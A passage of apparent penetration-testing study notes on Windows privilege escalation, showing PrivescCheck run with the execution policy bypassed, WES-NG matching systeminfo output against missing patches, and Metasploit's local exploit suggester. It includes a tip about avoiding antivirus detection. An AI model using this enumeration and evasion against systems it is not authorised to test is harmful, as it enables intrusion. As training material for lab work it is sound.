PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\> . .\PrivescCheck.ps1
PS C:\> Invoke-PrivescCheck
```


### WES-NG: Windows Exploit Suggester - Next Generation

**WES-NG (Windows Exploit Suggester - Next Gen)** — offline patch/exploit suggester: compare a machine’s `systeminfo` (patches/versions) against a database of known vulnerable versions.

Some exploit suggesting scripts (e.g. winPEAS) will require you to upload them to the target system and run them there. This may cause antivirus software to detect and delete them. To avoid making unnecessary noise that can attract attention, you may prefer to use WES-NG, which will run on your attacking machine (e.g. Kali or TryHackMe AttackBox).

WES-NG is a Python script that can be found and downloaded [here](https://github.com/bitsadmin/wesng).

Once installed, and before using it, type the `wes.py --update` command to update the database. The script will refer to the database it creates to check for missing patches that can result in a vulnerability you can use to elevate your privileges on the target system.

To use the script, you will need to run the `systeminfo` command on the target system. Do not forget to direct the output to a .txt file you will need to move to your attacking machine.

Once this is done, wes.py can be run as follows;

KaliLinux
```shell-session
user@kali$ wes.py systeminfo.txt
```

### Metasploit

**Metasploit local_exploit_suggester** — if you already have a Meterpreter session, it suggests local exploits that may work on that host.

